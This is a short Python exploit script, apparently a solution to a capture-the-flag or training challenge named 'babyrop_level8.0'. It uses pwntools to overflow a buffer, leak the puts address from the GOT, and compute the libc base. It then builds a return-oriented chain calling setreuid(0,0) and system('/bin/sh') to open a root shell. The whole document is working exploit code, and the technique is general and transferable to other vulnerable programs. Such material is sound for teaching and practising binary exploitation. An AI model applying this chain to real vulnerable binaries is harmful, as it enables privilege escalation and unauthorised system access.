### idea: ret2plt

from pwn import *

context.arch = 'amd64'

elf = ELF('/challenge/babyrop_level8.0')
rop = ROP(elf)

pop_rdi = rop.rdi.address

puts_plt = elf.plt.puts
puts_got = elf.got.puts
start = elf.sym['_start']

p = process(["/challenge/babyrop_level8.0"])
padding = b"A" * (0x70 + 8)

# leak puts@got addr
rop.raw(pop_rdi)
rop.raw(puts_got)
rop.raw(puts_plt)
rop.raw(start)

payload = padding + rop.chain()

p.send(payload)
p.recvuntil(b"Leaving!\n")
puts_addr = unpack(p.recvuntil(b"\n")[:-1], 'all')

# get libc base addr
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = puts_addr - libc.symbols['puts']

# system("/bin/sh")
bin_sh = next(libc.search(b'/bin/sh'))
rop = ROP(libc)
rop.setreuid(0, 0)  # equivalent to rop.call(libc.setreuid, [0, 0])
rop.system(bin_sh)  # equivalent to rop.call(libc.system, [bin_sh])
payload = padding + rop.chain()

p.send(payload)

p.interactive()
